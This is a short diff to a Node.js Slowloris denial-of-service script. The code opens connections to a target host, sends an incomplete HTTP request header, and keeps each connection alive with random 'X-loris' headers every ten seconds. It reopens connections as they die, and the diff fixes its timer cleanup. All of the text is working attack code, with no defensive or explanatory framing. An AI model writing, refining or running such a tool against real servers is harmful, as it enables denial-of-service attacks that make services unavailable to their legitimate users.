@@ -19,14 +19,14 @@ const open = ()=>{
 	const client = net.connect(args.port, args.host, ()=> {	
 		alive++;
 		//send just a part of the header, so the server keeps waiting for the rest of the request
-		client.write('GET / HTTP/1.1\r\n');
-		setInterval(()=>{
+		client.write('GET / HTTP/1.1\r\n');	
+	});	
+	const send = setInterval(()=>{
 		  //send some random stuff to keep connection open as long as possible
 		  client.write('X-loris:'+ Math.random()*999000);	
-		},10000)
-	});	
-	
+	},10000)
 	client.on('error', function() {
+		clearInterval(send);
 		//open a new connection every time a connection dies;
 		alive --;
 		open();
